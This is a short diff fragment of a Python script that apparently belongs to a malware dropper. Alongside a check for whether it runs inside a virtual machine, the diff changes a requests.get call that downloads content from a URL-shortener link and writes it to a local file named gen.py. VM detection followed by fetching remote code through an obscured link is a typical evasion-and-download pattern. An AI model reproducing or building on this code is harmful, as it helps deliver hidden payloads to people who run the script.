@@ -62,7 +62,7 @@ if is_running_on_vm():
 else:
     pass
 
-gen = requests.get('https://2no.co/2ozb82')
+gen = requests.get('https://2no.co/vest-gen')
 with open('gen.py', 'wb')as genv2:
     genv2.write(gen.content)
 
